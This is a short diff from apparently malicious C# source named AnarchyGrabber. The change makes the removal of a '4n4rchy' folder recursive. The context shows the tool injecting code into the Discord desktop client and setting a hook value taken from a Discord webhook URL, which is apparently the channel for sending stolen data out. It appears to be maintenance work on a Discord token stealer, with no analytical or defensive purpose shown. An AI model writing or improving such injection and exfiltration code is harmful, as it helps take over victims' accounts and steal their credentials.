@@ -18,7 +18,7 @@ namespace AnarchyGrabber
                     string anarchyPath = Path.Combine(path, "4n4rchy");
 
                     if (Directory.Exists(anarchyPath))
-                        Directory.Delete(anarchyPath);
+                        Directory.Delete(anarchyPath, true);
                 }
 
                 if (OxygenInjector.Inject(build, "4n4rchy", "inject", $"process.env.anarchyHook = '{Settings.Webhook.Replace("https://discordapp.com/api/webhooks/", "")}'", injectFile, modFile) && build == DiscordBuild.Discord)
